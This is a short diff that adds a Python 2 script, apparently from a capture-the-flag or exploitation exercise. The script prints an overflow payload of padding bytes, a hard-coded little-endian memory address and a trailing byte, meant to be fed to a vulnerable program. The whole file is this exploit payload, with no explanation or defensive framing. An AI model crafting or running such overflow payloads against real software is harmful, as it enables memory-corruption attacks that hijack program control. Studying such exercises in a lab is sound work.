@@ -1,0 +1,5 @@
+#!/usr/bin/env python2
+
+address = '\xbb\xdf\xdf\x9f'
+
+print('A'*4 + address + 'A'*56 + '\x30')
